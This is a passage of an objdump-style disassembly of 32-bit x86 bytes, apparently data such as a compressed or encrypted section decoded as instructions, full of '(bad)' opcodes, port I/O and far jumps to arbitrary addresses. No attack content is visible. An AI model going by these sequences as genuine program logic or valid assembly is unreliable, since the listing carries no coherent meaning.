  414667:	sbb    BYTE PTR [ecx-0x6a],al
  41466a:	(bad)  
  41466b:	std    
  41466c:	xchg   DWORD PTR [ebp+0x62],edi
  41466f:	or     al,0x38
  414671:	dec    edi
  414672:	jnp    0x4146f2
  414674:	cmp    eax,0x22197d2c
  414679:	mov    ?,WORD PTR [eax-0x697ea3c]
  41467f:	outs   dx,DWORD PTR ds:[esi]
  414680:	inc    edx
  414681:	xor    DWORD PTR gs:[esi+0x6b],0xffffffb1
  414686:	bound  esi,QWORD PTR [eax]
  414688:	mov    edx,0x80915885
  41468d:	fs mov esi,0xd1667535
  414693:	mov    ebp,0xde089716
  414698:	add    DWORD PTR [ecx+0x1881383b],ebp
  41469e:	icebp  
  41469f:	lea    esi,[ecx-0x2cf96a8c]
  4146a5:	call   0x37f5:0x746f8416
  4146ac:	inc    ebp
  4146ad:	dec    edi
  4146ae:	push   ebp
  4146af:	adc    ecx,esi
  4146b1:	add    ebp,DWORD PTR [esi+ebx*8-0x538e6577]
  4146b8:	arpl   cx,bx
  4146ba:	sbb    dl,BYTE PTR [edi+0x6d]
  4146bd:	push   eax
  4146be:	xchg   BYTE PTR [ebx+0x45c0cff4],dh
  4146c4:	push   ebp
  4146c5:	or     eax,DWORD PTR [ebx]
  4146c7:	pop    ebp
  4146c8:	mov    esp,0xb8e20708
  4146cd:	int    0xb6
  4146cf:	addr16 inc ebp
  4146d1:	xchg   ebx,eax
  4146d2:	cmp    DWORD PTR [esi+0x42],0xe7594bec
  4146d9:	lods   al,BYTE PTR gs:[esi]
  4146db:	bnd jo 0x4146e3
  4146de:	mov    cl,BYTE PTR [edx+eax*4]
  4146e1:	popf   
  4146e2:	pop    ds
  4146e3:	inc    esi
  4146e4:	xchg   BYTE PTR [eax],ah
  4146e6:	cmp    eax,0xe79311b0
  4146eb:	in     eax,dx
  4146ec:	jmp    0x4173:0x9a8465d1
  4146f3:	cdq    
  4146f4:	ror    BYTE PTR [eax+0x156b0d3d],1
  4146fa:	adc    dh,BYTE PTR [edi+0x66]
  4146fd:	cmc    
  4146fe:	lea    edx,[esi+ebp*2]
  414701:	xchg   esi,eax
  414702:	cmp    edx,ebx
  414704:	or     BYTE PTR [esp+ecx*1],dl
  414707:	mov    ds:0xcfbaa60c,eax
  41470c:	das    
  41470d:	and    al,BYTE PTR [edi+0x67]
  414710:	sti    
  414711:	dec    edx
  414712:	jb     0x41473f
  414714:	mov    WORD PTR [ebx+0x10479485],gs
  41471a:	mov    esp,0x24e0b5f0
  41471f:	xchg   ecx,eax
  414720:	std    
  414721:	mov    al,0x8f
  414723:	hlt    
  414724:	shr    al,cl
  414726:	fld    TBYTE PTR [edi-0x54]
  414729:	xchg   ebx,eax
  41472a:	aad    0x9f
  41472c:	out    0x2c,al
  41472e:	hlt    
  41472f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414730:	loope  0x41472b
  414732:	xchg   ebx,eax
  414733:	jl     0x414789
  414735:	ret    0xeaf8
  414738:	pmulhw mm3,QWORD PTR [ebx-0x29b85914]
  41473f:	bound  sp,DWORD PTR [eax-0x1cc7ebf4]
  414746:	test   edi,0x19ecf410
  41474c:	and    bl,dh
  41474e:	mov    ds:0x7f679357,eax
  414753:	and    BYTE PTR [edi],dl
  414755:	iret   
  414756:	cmp    al,0xaa
  414758:	aaa    
  414759:	fidivr WORD PTR [edx+edx*4-0x7e]
  41475d:	(bad)  
  41475e:	ds cmp eax,0x6bd2fb57
  414764:	in     al,dx
  414765:	dec    esp
  414766:	add    eax,0x290ab9f3
  41476b:	add    eax,0x649a8898
  414770:	adc    eax,0xf082a082
  414775:	cld    
  414776:	cmc    
  414777:	sahf   
  414778:	jo     0x4147e7
  41477a:	fwait
  41477b:	in     al,dx
  41477c:	test   ebp,eax
  41477e:	cmp    al,0x20
  414780:	inc    esi
  414781:	sub    al,BYTE PTR [ebx-0x503f2255]
  414787:	cmp    al,0x1
  414789:	inc    eax
  41478a:	or     DWORD PTR [ebx+0x4f],esi
  41478d:	dec    esp
  41478e:	dec    edx
  41478f:	adc    DWORD PTR [ecx-0x6c9c3ba4],eax
  414795:	lock (bad) 
  414797:	test   al,0x9e
  414799:	ins    BYTE PTR es:[edi],dx
  41479a:	addr16 mov ch,0xbd
  41479d:	sbb    BYTE PTR [ebp+0x3e],cl
  4147a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147a1:	push   ebp
  4147a2:	or     al,0xb5
  4147a4:	sub    BYTE PTR [ebx-0x1b],al
  4147a7:	xchg   DWORD PTR [esi],ecx
  4147a9:	ins    BYTE PTR es:[edi],dx
  4147aa:	in     eax,dx
  4147ab:	add    eax,0xc10500ad
  4147b0:	and    BYTE PTR [edi+0xd],ah
  4147b3:	push   0x4318a587
  4147b8:	sub    al,BYTE PTR [esi]
  4147ba:	xor    DWORD PTR [edx-0x679a62f2],0x85bd1240
  4147c4:	mov    dh,BYTE PTR [eax+0x1d]
  4147c7:	mov    esp,0x5403fbb7
  4147cc:	mov    ebp,ss
  4147ce:	sbb    eax,DWORD PTR [esi]
  4147d0:	(bad)  
  4147d1:	dec    edi
  4147d2:	out    0x30,eax
  4147d4:	sbb    esi,DWORD PTR [ebx+0x11a9c8bf]
  4147da:	punpckldq mm0,DWORD PTR [ebp+esi*1-0xb]
  4147df:	sub    eax,0x264d4eae
  4147e4:	jp     0x4147ef
  4147e6:	jo     0x4147d2
  4147e8:	jge    0x41476c
  4147ea:	shr    dh,cl
  4147ec:	mov    edi,0xaa751514
  4147f1:	lahf   
  4147f2:	sbb    bl,ch
  4147f4:	mov    cl,0x9e
  4147f6:	dec    esp
  4147f7:	sbb    eax,0x48efab1a
  4147fc:	es pop ebx
  4147fe:	mov    bl,0x96
  414800:	mov    ds:0x28f0adb8,al
  414805:	lds    ecx,FWORD PTR [edi-0x68]
  414808:	std    
  414809:	lock mov ebx,0x2108bfe
  41480f:	retf   0x3d74
  414812:	and    DWORD PTR [edx-0x40],esp
  414815:	into   
  414816:	mov    al,0x30
  414818:	jmp    0x872411da
  41481d:	lods   al,BYTE PTR ds:[esi]
  41481e:	and    BYTE PTR [edi+0x45],bh
  414821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414822:	jmp    0x53c7:0x7484fe75
  414829:	jo     0x4147c0
  41482b:	scas   al,BYTE PTR es:[edi]
  41482c:	mov    cl,0x35
  41482e:	ret    0x9a29
  414831:	jne    0x4147ea
  414833:	dec    ecx
  414834:	xchg   bp,ax
  414836:	ja     0x414884
  414838:	jnp    0x4147d7
  41483a:	xor    al,0x1c
  41483c:	dec    eax
  41483d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41483e:	into   
  41483f:	adc    eax,0x3a223559
  414844:	mov    edi,0x3ea511ca
  414849:	(bad)  
  41484a:	aad    0x61
  41484c:	sub    ebp,DWORD PTR [eax+0x3f]
  41484f:	mov    BYTE PTR [esi],al
  414851:	mov    esp,DWORD PTR [ebx+0x9]
  414854:	(bad)  
  414856:	inc    esi
  414857:	push   eax
  414858:	jo     0x4147e0
  41485a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41485b:	adc    ch,BYTE PTR [ebx]
  41485d:	call   0xf61e777f
  414862:	mov    eax,ds:0x7390ad2c
  414867:	popf   
  414868:	cmp    BYTE PTR [ebx],bh
  41486a:	add    esi,DWORD PTR [edi-0x7b577030]
  414870:	fcom   DWORD PTR [eax]
  414872:	std    
  414873:	adc    al,0xa5
  414875:	add    dh,BYTE PTR [edx]
  414877:	stos   DWORD PTR es:[edi],eax
  414878:	jle    0x414827
  41487a:	cmp    DWORD PTR [esi-0x1225777b],ebx
  414880:	mov    al,ds:0x3ca89f70
  414885:	add    al,0x1f
  414887:	inc    edx
  414888:	loopne 0x414856
  41488a:	jmp    0xafa79a3e
  41488f:	cmp    DWORD PTR [edi+ebx*4+0x5f6d460f],esi
  414896:	cmp    al,0x5
  414898:	enter  0xd93d,0xbd
  41489c:	clc    
  41489d:	or     al,0xd3
  41489f:	or     dh,ah
  4148a1:	sbb    cl,BYTE PTR [ecx*2-0x51655639]
  4148a8:	loop   0x414858
  4148aa:	outs   dx,BYTE PTR ds:[esi]
  4148ab:	sbb    DWORD PTR [edx],ebp
  4148ad:	shl    DWORD PTR [ebx],1
  4148af:	xor    esi,DWORD PTR [ecx+0x58]
  4148b2:	in     eax,0x61
  4148b4:	sbb    ebp,DWORD PTR [ecx+0x13]
  4148b7:	or     cl,0x3
  4148ba:	fidivr DWORD PTR [esi-0x197db30d]
  4148c0:	push   esi
  4148c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148c2:	xchg   DWORD PTR [ebx-0x6d],ebp
  4148c5:	and    DWORD PTR [edx-0x9],esi
  4148c8:	loopne 0x414941
  4148ca:	dec    esi
  4148cb:	shr    DWORD PTR [ecx+0x47],0x4a
  4148cf:	fnstenv [eax+0x6516e57]
  4148d5:	mov    al,0x33
  4148d7:	jbe    0x414903
  4148d9:	retf   0xf85b
  4148dc:	xor    eax,0xfc0f501c
  4148e1:	enter  0x499f,0x55
  4148e5:	jecxz  0x414962
  4148e7:	jecxz  0x414937
  4148e9:	cmp    bh,BYTE PTR [eax-0x629583a5]
  4148ef:	mov    edi,0xb6dba197
  4148f4:	jns    0x414915
  4148f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148f7:	adc    DWORD PTR [ebx],0xa5201b47
  4148fd:	sar    ecx,0xe0
  414900:	into   
  414901:	and    BYTE PTR [ebx+0x26b16565],al
  414907:	jl     0x414988
  414909:	push   esp
  41490a:	out    dx,eax
  41490b:	inc    edi
  41490c:	les    esi,FWORD PTR ds:0x9a17960
  414912:	loop   0x41498e
  414914:	fsub   st,st(4)
  414916:	hlt    
  414917:	jg     0x414963
  414919:	out    0x8,eax
  41491b:	dec    ebp
  41491c:	mov    eax,cs:0xdeb076a0
  414922:	fwait
  414923:	mov    bh,BYTE PTR [edx+0x73]
  414926:	icebp  
  414927:	ficom  WORD PTR [ebp-0x32]
  41492a:	adc    cl,dh
  41492c:	xchg   ebp,eax
  41492d:	push   es
  41492e:	shr    BYTE PTR [edi],0x25
  414931:	lds    cx,DWORD PTR [esi-0xb]
  414935:	stc    
  414936:	cs jmp 0xe07a:0x72bc54bc
  41493e:	loopne 0x4148ca
  414940:	mov    edi,0x41967413
  414945:	xlat   BYTE PTR ds:[ebx]
  414946:	pop    ebp
  414947:	xchg   ecx,eax
  414948:	retf   0x8c74
  41494b:	pop    ebx
  41494c:	(bad)  
  41494d:	scas   eax,DWORD PTR es:[edi]
  41494e:	je     0x4148e8
  414950:	ret    
  414951:	imul   esi,DWORD PTR [ebx],0x1616fdce
  414957:	mov    ebx,0xcf092089
  41495c:	xor    BYTE PTR [eax-0x595d5fc4],0xf3
  414963:	aad    0x99
  414965:	inc    edx
  414966:	cli    
  414967:	sub    dl,BYTE PTR [ebx-0x6d12b1ef]
  41496d:	pop    ecx
  41496e:	js     0x414904
  414970:	(bad)  
  414971:	enter  0x2fe1,0x14
  414975:	inc    edx
  414976:	daa    
  414977:	jl     0x414991
  414979:	xchg   edi,eax
  41497a:	push   ebx
  41497b:	into   
  41497c:	and    ecx,DWORD PTR [esp+edi*1+0x7b]
  414980:	jmp    0x41493b
  414982:	mov    esi,0x76bf9a9d
  414987:	outs   dx,BYTE PTR ds:[esi]
  414988:	pop    ss
  414989:	(bad)  
  41498a:	xlat   BYTE PTR ds:[ebx]
  41498b:	add    al,0x92
  41498d:	mov    eax,ds:0x64d91377
  414992:	xor    al,0xb9
  414994:	pop    ds
  414995:	push   0xfffffffd
  414997:	ficom  DWORD PTR [ecx+0x4e]
  41499a:	gs add al,0x98
  41499d:	jmp    DWORD PTR [edx+0x58]
  4149a0:	je     0x41495e
  4149a2:	idiv   bl
  4149a4:	retf   0xb2a2
  4149a7:	xchg   ebp,eax
  4149a9:	retf   
  4149aa:	adc    ebx,DWORD PTR [edi]
  4149ac:	mov    edi,0x873a0f02
  4149b1:	shr    DWORD PTR [eax-0x6d],0x60
  4149b5:	mov    ah,0xad
  4149b7:	inc    ebp
  4149b8:	repz push edi
  4149ba:	sar    BYTE PTR [ecx+0x2b],1
  4149bd:	pushf  
  4149be:	sti    
  4149bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c0:	aas    
  4149c1:	mov    esi,0x1dfa9693
  4149c6:	aam    0xe
  4149c8:	jo     0x414a12
  4149ca:	inc    eax
  4149cb:	popa   
  4149cc:	rcr    BYTE PTR [ecx-0x3c],1
  4149cf:	pop    esi
  4149d0:	add    BYTE PTR [ecx+0x3135dd17],bl
  4149d6:	out    0xa0,eax
  4149d8:	push   ecx
  4149d9:	pushf  
  4149da:	and    dh,BYTE PTR [esp+ebx*1+0x68]
  4149de:	add    ah,dl
  4149e0:	cmp    DWORD PTR [ebp-0x7a7767ee],edi
  4149e6:	mov    ebp,0xeac2a6cc
  4149eb:	sub    BYTE PTR [ecx+0x45],dl
  4149ee:	shl    DWORD PTR [ebx],1
  4149f0:	sub    eax,0x93a6b954
  4149f5:	adc    ecx,DWORD PTR [edx]
  4149f7:	aad    0x3f
  4149f9:	add    al,ch
  4149fb:	xor    dl,BYTE PTR [edx]
  4149fd:	mov    ebp,0x405004c6
  414a02:	pop    esp
  414a03:	dec    ebp
  414a04:	jecxz  0x4149e0
  414a06:	pop    ss
  414a07:	lds    esp,FWORD PTR [ecx+0x26]
  414a0a:	ja     0x414a84
  414a0c:	loopne 0x4149c8
  414a0e:	iret   
  414a0f:	jl     0x4149ad
  414a11:	push   edi
  414a12:	dec    edx
  414a13:	mov    ecx,edx
  414a15:	cmp    BYTE PTR [eax],dl
  414a17:	stc    
  414a18:	mov    esi,0x8de14ef9
  414a1d:	xor    al,ah
  414a1f:	and    al,0x73
  414a21:	add    edx,DWORD PTR [edi-0x27]
  414a24:	mov    ebx,0xf941367e
  414a29:	add    ebx,DWORD PTR [ecx+edi*2-0x57]
  414a2d:	mov    al,ds:0x5037f9bb
  414a32:	add    al,bh
  414a34:	aam    0x30
  414a36:	cld    
  414a37:	adc    eax,0x81c85967
  414a3c:	xor    edx,ebx
  414a3e:	rep movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  414a41:	mov    eax,0x9bf048cb
  414a46:	dec    ecx
  414a47:	adc    ebp,DWORD PTR [ebx+0x64]
  414a4a:	mov    ebx,DWORD PTR [eax]
  414a4c:	fs fsub st(3),st
  414a4f:	test   BYTE PTR [eax+0x2a4053c1],dh
  414a55:	inc    eax
  414a56:	not    BYTE PTR [ebx-0x2f]
  414a59:	ds clc 
  414a5b:	or     eax,DWORD PTR [ebx+ebp*1]
  414a5e:	data16 mov ch,0xb7
  414a61:	mov    esp,0x2add15c6
  414a66:	add    eax,0x15b7b113
  414a6b:	xor    esp,esi
  414a6d:	push   esi
  414a6e:	xor    eax,0x5f3543cb
  414a73:	mov    bh,0xb3
  414a75:	retf   
  414a76:	and    bl,BYTE PTR [ecx]
  414a78:	sbb    BYTE PTR [ecx],0x47
  414a7b:	add    cl,BYTE PTR [eax+ebp*1]
  414a7e:	rol    cl,0xc0
  414a81:	adc    BYTE PTR [eax],bh
  414a83:	call   0x296f3158
  414a88:	add    dl,bl
  414a8a:	jp     0x414a3e
  414a8c:	call   FWORD PTR [esi-0x738bd33]
  414a92:	push   ebp
  414a93:	aas    
  414a94:	xchg   dh,dl
  414a96:	stos   BYTE PTR es:[edi],al
  414a97:	mov    edi,0x270be4b2
  414a9c:	mov    dh,0xf
  414a9e:	or     ah,BYTE PTR [edx+ebp*1+0xf]
  414aa2:	fisub  WORD PTR es:[edx-0x3a962817]
  414aa9:	push   ecx
  414aaa:	(bad)  
  414aab:	out    dx,eax
  414aac:	repnz pop ds
  414aae:	and    bl,BYTE PTR ds:0x13e61a92
  414ab4:	in     al,0x7d
  414ab6:	lea    ebx,[esi-0x34f2e74b]
  414abc:	inc    ecx
  414abd:	aam    0xec
  414abf:	aam    0x7c
  414ac1:	or     al,cl
  414ac3:	int    0xa8
  414ac5:	out    0x7,al
  414ac7:	xor    al,0x90
  414ac9:	(bad)  
  414aca:	cmp    edi,DWORD PTR [ebx+0x6e28aae9]
  414ad0:	inc    ebp
  414ad1:	leave  
  414ad2:	js     0x414a6a
  414ad4:	enter  0x4e2e,0x15
  414ad8:	aas    
  414ad9:	or     BYTE PTR [edi+0x652999a7],al
  414adf:	(bad)  
  414ae0:	push   cs
  414ae1:	xchg   esp,eax
  414ae2:	nop
  414ae3:	outs   dx,DWORD PTR ds:[esi]
  414ae4:	cmp    BYTE PTR [edx+0x615bce78],bl
  414aea:	add    ebp,DWORD PTR [esi-0x51]
  414aed:	dec    eax
  414aee:	jle    0x414aec
  414af0:	mov    bl,0xc
  414af2:	scas   al,BYTE PTR es:[edi]
  414af3:	(bad)  
  414af4:	xchg   esp,eax
  414af5:	xchg   ebx,eax
  414af6:	ja     0x414a92
  414af8:	pop    ebx
  414af9:	inc    edi
  414afa:	adc    esp,eax
  414afc:	(bad)
  414b00:	pop    ds
  414b01:	jg     0x414b2c
  414b03:	push   eax
  414b04:	cmp    al,0x17
  414b06:	out    0xdf,eax
  414b08:	jno    0x414b12
  414b0a:	sbb    ebx,esp
  414b0c:	fdivrp st(6),st
  414b0e:	cmp    DWORD PTR [esi+eiz*2-0x4],ebx
  414b12:	pop    DWORD PTR [edx+edx*8]
  414b15:	sub    bl,BYTE PTR [ecx-0x69]
  414b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b19:	daa    
  414b1a:	sub    BYTE PTR [edi-0x75be87d4],0x43
  414b21:	dec    ebx
  414b22:	int    0x63
  414b24:	dec    ebp
  414b25:	scas   eax,DWORD PTR es:[edi]
  414b26:	and    al,0xaf
  414b28:	push   eax
  414b29:	imul   esp,DWORD PTR [edx-0x744dbdb3],0x45ec9239
  414b33:	dec    eax
  414b34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b35:	mov    ds:0x9c5a88e5,eax
  414b3a:	test   BYTE PTR [ebp-0x3a5f8f10],ah
  414b40:	mov    bl,0x86
  414b42:	into   
  414b43:	pusha  
  414b44:	add    eax,0xb6f991c7
  414b49:	gs icebp 
  414b4b:	add    eax,DWORD PTR [ecx+edx*1+0x3d0290f9]
  414b52:	push   esi
  414b53:	mov    edi,0xdad49e9c
  414b58:	mov    ds:0x53f72b9c,eax
  414b5d:	les    ecx,FWORD PTR [esi]
  414b5f:	dec    edx
  414b60:	dec    ebp
  414b61:	fisub  WORD PTR [edx-0x5d]
  414b64:	in     al,0x89
  414b66:	mov    cl,0xa
  414b68:	and    al,BYTE PTR [ebx+0x6b]
  414b6b:	push   ecx
  414b6c:	or     DWORD PTR [edi+ecx*2+0x40],esi
  414b70:	fisubr WORD PTR [ebp+0x4e]
  414b73:	mov    esi,0xeb36ab09
  414b78:	aaa    
  414b79:	fucom  st(4)
  414b7b:	pop    ecx
  414b7c:	add    al,0xb9
  414b7e:	repnz (bad) 
  414b80:	out    dx,al
  414b81:	pusha  
  414b82:	pop    edx
  414b83:	xchg   ecx,eax
  414b84:	or     eax,0xe5f1193
  414b89:	cld    
  414b8a:	pop    eax
  414b8b:	cmp    BYTE PTR [ecx-0x19],ah
  414b8e:	shr    DWORD PTR [ecx+0x7454fbef],0x6e
  414b95:	pop    esi
  414b96:	or     edi,DWORD PTR [edi+0xdcd4d5e]
  414b9c:	or     ch,BYTE PTR [ebx]
  414b9e:	dec    ebp
  414b9f:	fsubr  DWORD PTR [eax+0x33]
  414ba2:	js     0x414b67
  414ba4:	and    dh,ch
  414ba6:	or     esi,DWORD PTR [esi-0x76]
  414ba9:	jp     0x414b3b
  414bab:	mov    ebp,ds
  414bad:	(bad)  
  414bae:	and    ebx,DWORD PTR [ebx+0xa197fd9]
  414bb4:	sti    
  414bb5:	fisubr WORD PTR [ebp+ebp*4+0x71794118]
  414bbc:	push   ebp
  414bbd:	(bad)  
  414bbf:	loopne 0x414b54
  414bc1:	push   0x50eea03d
  414bc6:	add    dh,BYTE PTR [ebx+0x4e]
  414bc9:	pusha  
  414bca:	cmp    esi,ebp
  414bcc:	jne    0x414c13
  414bce:	dec    edx
  414bcf:	pop    edx
  414bd0:	popa   
  414bd1:	mov    ?,ecx
  414bd3:	mov    esp,0x47d73624
  414bd8:	xor    esp,ebx
  414bda:	cs pop esi
  414bdc:	mov    bl,0xda
  414bde:	or     DWORD PTR [edx-0x41157442],0x66eaa0fe
  414be8:	push   0x49
  414bea:	(bad)  
  414beb:	dec    ebp
  414bec:	das    
  414bed:	arpl   WORD PTR ds:0xd1b7fbbb,bx
  414bf3:	jle    0x414c1c
  414bf5:	jp     0x414c2f
  414bf7:	or     dl,bl
  414bf9:	lods   al,BYTE PTR ds:[esi]
  414bfa:	add    ecx,DWORD PTR [edx+0x6]
  414bfd:	hlt    
  414bfe:	loopne 0x414bea
  414c00:	ins    BYTE PTR es:[edi],dx
  414c01:	and    ah,BYTE PTR [eax]
  414c03:	push   esp
  414c04:	retf   
  414c05:	mov    ah,BYTE PTR [ebx+0x3b]
  414c08:	mov    esi,0x5503bc68
  414c0d:	lahf   
  414c0e:	icebp  
  414c0f:	mov    bl,0xfb
  414c11:	in     al,0x8e
  414c13:	push   0xb7c3aafe
  414c18:	xor    ah,cl
  414c1a:	retf   
  414c1b:	outs   dx,DWORD PTR ds:[esi]
  414c1c:	test   al,0x27
  414c1e:	xlat   BYTE PTR ds:[ebx]
  414c1f:	pop    edx
  414c20:	mov    dl,BYTE PTR [edi]
  414c22:	lods   al,BYTE PTR ds:[esi]
  414c23:	call   0xa9eb:0x631ffb00
  414c2a:	xchg   ecx,eax
  414c2b:	sub    bl,ah
  414c2d:	or     DWORD PTR [edi-0x52],0x78406559
  414c34:	fidiv  DWORD PTR [ebp-0x34]
  414c37:	out    dx,al
  414c38:	mov    esp,0x14c64b78
  414c3d:	push   0xa51cd2bf
  414c42:	sar    BYTE PTR gs:[esi],1
  414c45:	es jmp 0x414c68
  414c48:	and    edx,esp
  414c4a:	popa   
  414c4b:	inc    edi
  414c4c:	rcl    edi,1
  414c4e:	dec    ecx
  414c4f:	ds xchg ecx,eax
  414c51:	add    bh,BYTE PTR [edx-0x5361ec73]
  414c57:	mov    eax,0x998fc2f4
  414c5c:	jo     0x414c7e
  414c5e:	fiadd  WORD PTR [ecx-0x68431dd5]
  414c64:	clc    
  414c65:	ficomp WORD PTR [esi+0x11819fd3]
  414c6b:	pop    es
  414c6c:	cdq    
  414c6d:	add    al,0x47
  414c6f:	rcl    DWORD PTR [edx],1
  414c71:	fadd   QWORD PTR [eax]
  414c73:	cmp    al,0xea
  414c75:	and    eax,DWORD PTR [eax+0x57]
  414c78:	adc    esi,edi
  414c7a:	test   BYTE PTR [esi+0x2d],bh
  414c7d:	sbb    BYTE PTR [esi+edi*1-0x31],al
  414c81:	add    al,0x29
  414c83:	sbb    DWORD PTR [ecx+eiz*2+0x77f63572],ebx
  414c8a:	push   es
  414c8b:	sbb    al,0x24
  414c8d:	call   0x6141b7ec
  414c92:	cmp    ebp,DWORD PTR [esi-0x188610bb]
  414c98:	push   esi
  414c99:	mov    DWORD PTR [edx-0x59],0x32faacb4
  414ca0:	in     eax,0xd
  414ca2:	test   al,0x9b
  414ca4:	stos   BYTE PTR es:[edi],al
  414ca5:	ins    DWORD PTR es:[edi],dx
  414ca6:	mov    edx,0x4998d016
  414cab:	xlat   BYTE PTR ds:[ebx]
  414cac:	shl    BYTE PTR [ebx-0x50],1
  414caf:	fisub  DWORD PTR [edi]
  414cb1:	cmp    eax,0x3d5f3697
  414cb6:	mov    dl,0x39
  414cb8:	mov    eax,ds:0x9c90dc84
  414cbd:	jno    0x414cf9
  414cbf:	cdq    
  414cc0:	aam    0xef
  414cc2:	mov    al,BYTE PTR [ebx-0x252213a9]
  414cc8:	fdivr  QWORD PTR [edi]
  414cca:	sub    eax,DWORD PTR [edx]
  414ccc:	stos   DWORD PTR es:[edi],eax
  414ccd:	sbb    dh,dh
  414ccf:	xchg   ebp,eax
  414cd0:	adc    DWORD PTR [edi],ebp
  414cd2:	xchg   edx,eax
  414cd3:	mov    bh,0x28
  414cd5:	cmp    bl,BYTE PTR [ebx-0x4bb5db8b]
  414cdb:	sub    edi,DWORD PTR [eax+0x71]
  414cde:	sti    
  414cdf:	daa    
  414ce0:	inc    edx
  414ce1:	xor    DWORD PTR [edx],edx
  414ce3:	je     0x414ccf
  414ce5:	pop    eax
  414ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ce7:	xchg   DWORD PTR [ebp+0x101898b3],ebp
  414ced:	pushf  
  414cee:	add    BYTE PTR [ebx+edx*8+0x6b],al
  414cf2:	in     al,0x6a
  414cf4:	fist   DWORD PTR [ebx-0xbb04f5c]
  414cfa:	in     eax,0xd6
  414cfc:	pop    eax
  414cfd:	add    BYTE PTR [edi],dh
  414cff:	add    edi,DWORD PTR [edx]
  414d01:	pop    ebp
  414d02:	mov    ah,0x5c
  414d04:	push   esi
  414d05:	or     BYTE PTR [edi],bl
  414d07:	jns    0x414cce
  414d09:	pop    ebx
  414d0a:	imul   esp,DWORD PTR [edx+0x45],0x5db79d64
  414d11:	or     DWORD PTR [edx-0x65869e81],esp
  414d17:	mov    cl,0xd8
  414d19:	xor    ebp,ebx
  414d1b:	cmc    
  414d1c:	(bad)  
  414d1d:	inc    ebx
  414d1e:	test   eax,0x2b341801
  414d23:	sub    al,0x61
  414d25:	inc    edi
  414d26:	pop    esi
  414d27:	scas   al,BYTE PTR es:[edi]
  414d28:	push   ecx
  414d29:	mov    ebp,0xbee4a3bf
  414d2e:	ret    
  414d2f:	push   eax
  414d30:	pop    esp
  414d31:	pushf  
  414d32:	mov    eax,0xc064cbff
  414d37:	popa   
  414d38:	scas   al,BYTE PTR es:[edi]
  414d39:	ins    DWORD PTR es:[edi],dx
  414d3a:	sbb    al,0xc1
  414d3c:	stos   DWORD PTR es:[edi],eax
  414d3d:	mov    ds:0x5cd5bb11,eax
  414d42:	retf   0x9450
  414d45:	dec    edi
  414d46:	jmp    0x414dbb
  414d48:	push   edi
  414d49:	inc    esp
  414d4a:	sub    bh,BYTE PTR [ecx+0x3f]
  414d4d:	xlat   BYTE PTR ds:[ebx]
  414d4e:	pop    edi
  414d4f:	pop    edx
  414d50:	add    dh,BYTE PTR [ebp+0x1e]
  414d53:	sub    BYTE PTR [ebx+0x492d594f],ch
  414d59:	sbb    BYTE PTR [edx-0x613249fd],dl
  414d5f:	dec    esi
  414d60:	and    BYTE PTR [eax-0x6b],ah
  414d63:	(bad)  
  414d64:	aam    0xd9
  414d66:	test   BYTE PTR [ebp+0x4f00290],cl
  414d6c:	xchg   ecx,eax
  414d6d:	dec    ebp
  414d6e:	push   ecx
  414d6f:	mov    al,ah
  414d71:	ret    0xddd8
  414d74:	enter  0xa45,0xc1
  414d78:	scas   eax,DWORD PTR es:[edi]
  414d79:	dec    ebp
  414d7a:	sub    eax,0x28d74beb
  414d7f:	pop    edi
  414d80:	mov    al,0x75
  414d82:	test   ah,cl
  414d84:	jecxz  0x414dc5
  414d86:	stc    
  414d87:	mov    eax,ds:0x1c120c6
  414d8c:	mov    ah,ah
  414d8e:	iret   
  414d8f:	fistp  WORD PTR [edi+0x5972cb17]
  414d95:	aad    0xc
  414d97:	pop    es
  414d98:	aaa    
  414d99:	xchg   edi,eax
  414d9a:	mov    ch,BYTE PTR [edi]
  414d9c:	mov    edx,0x5d579ecd
  414da1:	sub    edx,ecx
  414da3:	push   edi
  414da4:	fsub   QWORD PTR [ebp+0x2d06ae99]
  414daa:	adc    BYTE PTR [ecx+0x46],cl
  414dad:	int    0x74
  414daf:	jns    0x414dee
  414db1:	lahf   
  414db2:	mov    ss,WORD PTR [ebp-0x2cca5f39]
  414db8:	mov    dh,0x3a
  414dba:	or     esp,eax
  414dbc:	mov    ds:0x1a1b832b,eax
  414dc1:	cmp    BYTE PTR [ebx+0x6c1a23a9],dh
  414dc7:	je     0x414e03
  414dc9:	jns    0x414dde
  414dcb:	in     al,0xc2
  414dcd:	cli    
  414dce:	jle    0x414d95
  414dd0:	inc    eax
  414dd1:	sahf   
  414dd2:	imul   ebx,DWORD PTR [ebx],0xfe35471e
  414dd8:	sbb    edx,DWORD PTR [edx]
  414dda:	sbb    al,0x23
  414ddc:	(bad)  
  414ddd:	mov    bh,0x87
  414ddf:	sbb    bh,BYTE PTR [edi-0x181708b0]
  414de5:	imul   ebx,esp,0x1c
  414de8:	cmp    esi,esi
  414dea:	or     DWORD PTR [edi+eax*2],ebx
  414ded:	jl     0x414e2c
  414def:	push   0xffffff87
  414df1:	pushf  
  414df2:	push   0xea6d02e3
  414df7:	jo     0x414df5
  414df9:	pop    edx
  414dfa:	dec    ebp
  414dfc:	popf   
  414dfd:	test   DWORD PTR [edx-0x62a723db],ebp
  414e03:	(bad)  
  414e04:	or     al,0x1
  414e06:	lahf   
  414e07:	(bad)  
  414e08:	xchg   ecx,eax
  414e09:	pop    ecx
  414e0a:	jns    0x414e44
  414e0c:	cli    
  414e0d:	nop
  414e0e:	out    0xc6,al
  414e10:	es xchg ecx,ebx
  414e13:	inc    ecx
  414e14:	outs   dx,BYTE PTR ds:[esi]
  414e15:	mul    DWORD PTR [ebp-0x21]
  414e18:	enter  0xa752,0xcb
  414e1c:	test   BYTE PTR [ebp+0x74a34cd8],0xc8
  414e23:	loope  0x414e8c
  414e25:	repnz lea ecx,[ecx-0x25]
  414e29:	scas   eax,DWORD PTR es:[edi]
  414e2a:	jnp    0x414df5
  414e2c:	and    DWORD PTR [ebx],eax
  414e2e:	push   cs
  414e2f:	mov    edx,ebp
